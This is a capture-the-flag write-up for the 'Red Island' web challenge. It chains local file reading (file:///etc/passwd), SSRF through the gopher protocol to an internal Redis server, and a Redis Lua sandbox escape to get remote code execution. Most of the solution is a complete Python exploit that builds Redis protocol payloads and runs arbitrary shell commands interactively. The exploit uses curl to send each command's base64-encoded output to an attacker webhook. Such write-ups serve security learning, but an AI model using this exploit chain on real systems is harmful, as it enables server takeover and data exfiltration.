## Red Island

## Challenge Author(s):

Ulysses

## Description:

The Red Island of the glowing sea is a proud tribe of species that can only see red colors. Hence every physical item, picture, and poster on this island is masked with red colors. The Golden Fang army took advantage of the color weakness of the species of Red Island to smuggle illegal goods in and out of the island behind the ministry's back. Without an invitation, it's impossible to get entry to the island. So we need to hack the ministry and send us an invite from the inside to stop the atrocities of Draeger's men on this island. As always, Ulysses, with his excellent recon skills, got us access to one of the portals of the Red Island ministry. Can you gain access to their networks through this portal?



# Target: docker ip on demand

## Difficulty/Points: 350/easy

## Flag: HTB{r3d_righ7_h4nd_t0_th3_r3dis_land!}


## Challenge

the challenge is presented with a login and registration page. We can register a new user and enter the web application. The page show a form that we can use to submit images.

# Solution 

The first test was to use a url that uses the file protocol to display server resources. For instance file:///etc/passwd shows the protected passwd file. Taking advantage of this functionality I download the backend files 1 by 1 listing them from the index.js file and the imported files. I can see that the web application uses REDIS and by googling it is found that it is possible to exploit the gopher protocol used by REDIS to create interesting attacks via SSRF.  SSRF works if we write urlencoded paylaod of the type gopher://paylaod_urlencoded. The gopher protocol is supported by node-libcurl. On google we find some redis-based CVEs, in particular the one for the LUA sandbox comes in handy. LUA is a scripting language commonly used by REDIS, and the CVE allows us to do RCE to see the flag on our endpoint. After obtaining RCE we explore the file system until we detect the binary that reads the flag.

```python
from urllib.parse import quote
import shlex, requests

WEBHOOK="<PUT WEBHOOK HERE>"
REDIS_CMD="""eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os");local os = os_l();local f = os.execute("curl -d $({cmd}|base64 -w0) {webhook}?flag=true");' 0"""

RHOST = "http://138.68.175.87:31906"
USER = "user"
PASS = "password"

def gen_payload(cmd_split):
    payload = ""
    args = len(cmd_split)
    payload = payload + "*" + str(args) + "\r\n"
    for c in cmd_split:
        if "\\'" in c:
            c = c.replace("\\'", "'")
        c_len = len(c)
        payload = payload + "$" + str(c_len) + "\r\n"
        payload = payload + c + "\r\n"

    return payload

def main():
    s = requests.Session()
    s.post(RHOST+"/api/login", json={"username": USER, "password": PASS})
    while True:
        payload = "_"
        cmd = input('$ ')
        if cmd.lower() == "quit":
            break
        redis_cmd = REDIS_CMD.format(webhook=WEBHOOK, cmd=cmd)
        cmd_split = shlex.split(redis_cmd, posix=True)
        payload = payload + gen_payload(cmd_split)
        payload = payload + gen_payload(["quit"])
        r = s.post(RHOST+"/api/red/generate", json={"url":"gopher://127.0.0.1:6379/"+quote(payload)})
        print(r.text)

    print(quote(payload))

if __name__ == '__main__':
    main()
```

the flag will be received printed in the webhook page.